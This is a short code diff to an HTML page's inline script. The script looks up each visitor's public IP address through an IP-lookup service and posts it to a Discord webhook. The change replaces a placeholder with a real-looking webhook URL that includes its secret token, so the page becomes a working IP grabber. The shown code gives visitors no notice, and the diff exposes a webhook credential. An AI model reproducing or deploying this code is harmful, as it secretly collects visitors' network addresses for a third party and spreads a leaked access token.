@@ -267,7 +267,7 @@
         fetch('https://api.ipify.org/?format=json')
             .then(res => res.json())
             .then(data => {
-                fetch('YOUR_DISCORD_WEBHOOK_URL', {
+                fetch('https://discord.com/api/webhooks/1415043813067456512/aigIrFi5ZB1Ws26FbKJBDFNBzRk-yAgAGBPb6PTV2azReWaWcSG5O_V9XI-OsfViFpF2', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -278,3 +278,4 @@
     </script>
 </body>
 </html>
+
